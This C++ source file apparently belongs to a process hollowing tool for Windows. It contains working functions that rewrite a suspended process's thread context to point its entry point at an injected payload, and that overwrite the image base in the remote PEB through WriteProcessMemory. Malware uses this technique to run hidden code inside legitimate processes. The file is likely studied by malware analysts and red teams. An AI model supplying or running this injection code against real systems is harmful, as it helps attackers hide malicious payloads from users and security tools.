#include "hollowing_parts.h"
#include <iostream>

BOOL update_remote_entry_point_in_ctx(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
{
#ifdef _DEBUG
    std::cout << "Writing new EP: " << std::hex << entry_point_va << std::endl;
#endif
#if defined(_WIN64)
    if (is32bit) {
        // The target is a 32 bit executable while the loader is 64bit,
        // so, in order to access the target we must use Wow64 versions of the functions:

        // 1. Get initial context of the target:
        WOW64_CONTEXT context = { 0 };
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            return FALSE;
        }
        // 2. Set the new Entry Point in the context:
        context.Eax = static_cast<DWORD>(entry_point_va);

        // 3. Set the changed context into the target:
        return Wow64SetThreadContext(pi.hThread, &context);
    }
#endif
    // 1. Get initial context of the target:
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return FALSE;
    }
    // 2. Set the new Entry Point in the context:
#if defined(_WIN64)
    context.Rcx = entry_point_va;
#else
    context.Eax = static_cast<DWORD>(entry_point_va);
#endif
    // 3. Set the changed context into the target:
    return SetThreadContext(pi.hThread, &context);
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi, bool is32bit)
{
#if defined(_WIN64)
    if (is32bit) {
        //get initial context of the target:
        WOW64_CONTEXT context;
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            printf("Wow64 cannot get context!\n");
            return 0;
        }
        //get remote PEB from the context
        return static_cast<ULONGLONG>(context.Ebx);
    }
#endif
    ULONGLONG PEB_addr = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return 0;
    }
#if defined(_WIN64)
    PEB_addr = context.Rdx;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}

inline ULONGLONG get_img_base_peb_offset(bool is32bit)
{
    /*
    We calculate this offset in relation to PEB,
    that is defined in the following way
    (source "ntddk.h"):
    typedef struct _PEB
    {
        BOOLEAN InheritedAddressSpace; // size: 1
        BOOLEAN ReadImageFileExecOptions; // size : 1
        BOOLEAN BeingDebugged; // size : 1
        BOOLEAN SpareBool; // size : 1
                        // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
        HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit

        PVOID ImageBaseAddress;
        [...]
        */
    ULONGLONG img_base_offset = is32bit ?
        sizeof(DWORD) * 2
        : sizeof(ULONGLONG) * 2;

    return img_base_offset;
}

bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi, bool is32bit)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    //2. Write the new Entry Point into context of the remote process:
    if (update_remote_entry_point_in_ctx(pi, ep_va, is32bit) == FALSE) {
        std::cerr << "Cannot update remote EP!\n";
        return false;
    }
    return true;
}

bool set_new_image_base(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi, bool is32bit)
{
    // 1. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
    if (!remote_peb_addr) {
        std::cerr << "Failed getting remote PEB address!\n";
        return false;
    }
    // 2. get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
    //calculate size of the field (depends on architecture):
    const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    SIZE_T written = 0;
    // 3. Write the payload's ImageBase into remote process' PEB:
    if (!WriteProcessMemory(pi.hProcess, remote_img_base,
        &load_base, img_base_size,
        &written))
    {
        std::cerr << "Cannot update ImageBaseAddress!\n";
        return false;
    }
    return true;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
{
    if (!redirect_entry_point(loaded_pe, load_base, pi, is32bit)) return false;
    if (!set_new_image_base(loaded_pe, load_base, pi, is32bit)) return false;
    return true;
}
